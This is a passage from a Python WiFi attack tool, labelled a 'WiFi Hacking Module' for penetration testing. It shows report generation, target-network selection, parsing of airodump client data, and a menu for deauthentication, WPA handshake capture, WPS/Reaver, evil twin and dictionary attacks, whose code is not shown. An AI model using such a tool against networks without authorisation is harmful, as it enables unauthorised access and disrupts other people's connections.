                    f.write(f"    Encryption: {network.encryption}\n")
                    f.write(f"    Authentication: {network.auth_type}\n")
                    
                    # Security assessment
                    if network.encryption == 'Open':
                        f.write(f"    Security Risk: HIGH (Open network)\n")
                    elif network.encryption == 'WEP':
                        f.write(f"    Security Risk: HIGH (WEP is broken)\n")
                    elif network.encryption in ['WPA', 'WPA2']:
                        f.write(f"    Security Risk: MEDIUM (Check for weak passwords)\n")
                    
                    f.write("\n")
                
                # Statistics
                total_networks = len(self.discovered_networks)
                open_networks = len([n for n in self.discovered_networks if n.encryption == 'Open'])
                wep_networks = len([n for n in self.discovered_networks if n.encryption == 'WEP'])
                wpa_networks = len([n for n in self.discovered_networks if n.encryption in ['WPA', 'WPA2']])
                
                f.write("SECURITY STATISTICS\n")
                f.write("==================\n\n")
                f.write(f"Total Networks: {total_networks}\n")
                f.write(f"Open Networks: {open_networks} ({open_networks/total_networks*100:.1f}%)\n")
                f.write(f"WEP Networks: {wep_networks} ({wep_networks/total_networks*100:.1f}%)\n")
                f.write(f"WPA/WPA2 Networks: {wpa_networks} ({wpa_networks/total_networks*100:.1f}%)\n\n")
                
                f.write("SECURITY RECOMMENDATIONS\n")
                f.write("========================\n\n")
                f.write("1. Use WPA3 encryption when available\n")
                f.write("2. Use strong, unique passwords (>12 characters)\n")
                f.write("3. Disable WPS if not needed\n")
                f.write("4. Change default SSID and admin passwords\n")
                f.write("5. Enable MAC address filtering for sensitive networks\n")
                f.write("6. Regularly update router firmware\n")
                f.write("7. Use enterprise authentication (802.1X) for business networks\n")
            
            print(f"{Colors.SUCCESS}  Report generated: {report_file}")
            
        except Exception as e:
            self.logger.error(f"Report generation error: {e}")
            print(f"{Colors.ERROR}  Report generation failed: {e}")
    
    def module_information(self):
        """Display module information"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}ℹ{Colors.CYAN}] WiFi Module Information")
        
        print(f"\n{Colors.MAGENTA}  Module Details:")
        print(f"{Colors.GREEN}    • Name: {Colors.INFO}WiFi Hacking Module")
        print(f"{Colors.GREEN}    • Version:{Colors.RED} 1.0")
        print(f"{Colors.GREEN}    • Author: {Colors.YELLOW}N3twork(GHANA) - {Colors.RED}Computer Hacker & Programmer")
        print(f"{Colors.GREEN}    • Purpose: {Colors.INFO}WiFi penetration testing")
        
        print(f"\n{Colors.MAGENTA}  Capabilities:")
        print(f"{Colors.CYAN}    • Network discovery and enumeration")
        print(f"{Colors.CYAN}    • Client identification")
        print(f"{Colors.CYAN}    • Deauthentication attacks")
        print(f"{Colors.CYAN}    • WPA/WPA2 handshake capture")
        print(f"{Colors.CYAN}    • WPS attacks ({Colors.SUCCESS}Reaver{Colors.CYAN})")
        print(f"{Colors.CYAN}    • Evil twin access points")
        print(f"{Colors.CYAN}    • Dictionary attacks")
        print(f"{Colors.CYAN}    • Security assessment reporting")
        
        print(f"\n{Colors.MAGENTA}  Requirements:")
        print(f"{Colors.YELLOW}    • WiFi adapter with monitor mode support")
        print(f"{Colors.YELLOW}    • Aircrack-ng suite")
        print(f"{Colors.YELLOW}    • Root privileges")
        
        print(f"\n{Colors.MAGENTA}  Status:")
        print(f"{Colors.SUCCESS if self.wifi_available else Colors.ERROR}    • WiFi: {f'{Colors.YELLOW}Available' if self.wifi_available else 'Not Available'}")
        print(f"{Colors.INFO}    • Interfaces: {Colors.SUCCESS}{len(self.wifi_interfaces)}")
        print(f"{Colors.INFO}    • Discovered networks: {Colors.SUCCESS}{len(self.discovered_networks)}")
    
    def _select_interface(self) -> bool:
        """Select WiFi interface"""
        if not self.wifi_interfaces:
            print(f"{Colors.ERROR}  No WiFi interfaces available")
            return False
        
        if len(self.wifi_interfaces) == 1:
            self.current_interface = self.wifi_interfaces[0]
            print(f"{Colors.INFO}  Using interface: {self.current_interface}")
            return True
        
        print(f"\n{Colors.INFO}  Available interfaces:")
        for i, iface in enumerate(self.wifi_interfaces, 1):
            print(f"{Colors.GREEN}    [{i}] {iface}")
        
        try:
            choice_input = input(f"\n{Colors.GREEN}  Select interface [1]: {Colors.YELLOW}") or "1"
            choice = InputValidator.validate_integer(choice_input, 1, len(self.wifi_interfaces))
            
            self.current_interface = self.wifi_interfaces[choice - 1]
            print(f"{Colors.INFO}  Selected interface: {self.current_interface}")
            return True
            
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid selection: {e}")
            return False
    
    def _select_target_network(self) -> Optional[WifiNetwork]:
        """Select target network from discovered networks"""
        if not self.discovered_networks:
            print(f"{Colors.ERROR}  No networks available")
            return None
        
        print(f"\n{Colors.INFO}  Available targets:")
        for i, network in enumerate(self.discovered_networks, 1):
            print(f"{Colors.GREEN}    [{i}] {network.essid} ({network.bssid}) - {network.encryption}")
        
        try:
            choice_input = input(f"\n{Colors.GREEN}  Select target [1]: {Colors.YELLOW}") or "1"
            choice = InputValidator.validate_integer(choice_input, 1, len(self.discovered_networks))
            
            return self.discovered_networks[choice - 1]
            
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid selection: {e}")
            return None
    
    def _parse_client_data(self, csv_file: str) -> List[Dict[str, Any]]:
        """Parse client data from airodump CSV"""
        clients = []
        
        try:
            if not os.path.exists(csv_file):
                return clients
            
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            # Find client section
            client_start = -1
            for i, line in enumerate(lines):
                if line.startswith('Station MAC'):
                    client_start = i + 1
                    break
            
            if client_start == -1:
                return clients
            
            # Parse client data
            for line in lines[client_start:]:
                if line.strip():
                    try:
                        parts = [part.strip() for part in line.split(',')]
                        if len(parts) >= 6 and parts[0]:  # Valid client MAC
                            client = {
                                'mac': parts[0],
                                'power': parts[3] if parts[3] else 'Unknown',
                                'packets': parts[2] if parts[2] else '0',
                                'bssid': parts[5] if parts[5] else 'Not associated'
                            }
                            clients.append(client)
                    except:
                        continue
                        
        except Exception as e:
            self.logger.error(f"Client data parsing error: {e}")
        
        return clients
    
    def main(self):
        """Main WiFi module loop"""
        if not self.wifi_available:
            print(f"\n{Colors.ERROR}  WiFi hardware or tools not available!")
            print(f"{Colors.INFO}  Please check:")
            print(f"{Colors.YELLOW}    • WiFi adapter is connected and supports monitor mode")
            print(f"{Colors.YELLOW}    • Aircrack-ng suite is installed: sudo apt install aircrack-ng")
            print(f"{Colors.YELLOW}    • Required tools are available")
            input(f"\n{Colors.GREEN}  Press Enter to continue anyway...")
        
        try:
            while True:
                try:
                    SystemUtils.clear_screen()
                    self.show_menu()
                    choice = MenuRenderer.get_user_input(self.hostname)
                    
                    if choice == "0":
                        print(f"\n{Colors.MAGENTA} 🚪{Colors.YELLOW}Returning to main menu...")
                        break
                    elif choice == "1":
                        self.network_discovery()
                    elif choice == "2":
                        self.client_enumeration()
                    elif choice == "3":
                        self.deauth_attack()
                    elif choice == "4":
                        self.handshake_capture()
                    elif choice == "5":
                        self.wps_attack()
                    elif choice == "6":
                        self.evil_twin_attack()
                    elif choice == "7":
                        self.dictionary_attack()
                    elif choice == "8":
                        self.wifi_tools()
                    elif choice == "9":
                        self.generate_report()
                    elif choice == "10":
                        self.module_information()
                    else:
                        print(f"\n{Colors.WARNING}'{choice}' is not a valid option!")
                    
                    if choice != "0":
                        input(f"\n  {Colors.GREEN}Press Enter to continue...")
                        
                except (KeyboardInterrupt, EOFError):
                    print(f"\n{Colors.MAGENTA} 🚪{Colors.YELLOW}Returning to main menu...")
                    break
                    
        except Exception as e:
            self.logger.error(f"WiFi module error: {e}", exc_info=True)
            print(f"{Colors.ERROR}Module error: {e}")
        finally:
            # Cleanup monitor mode if active
            if self.scanner.monitor_interface:
                try:
                    self.scanner.disable_monitor_mode(self.scanner.monitor_interface)
                except:
                    pass

if __name__ == "__main__":
    try:
        wifi_module = WifiModule()
        wifi_module.main()
    except Exception as e:
        print(f"{Colors.ERROR}Critical error: {e}")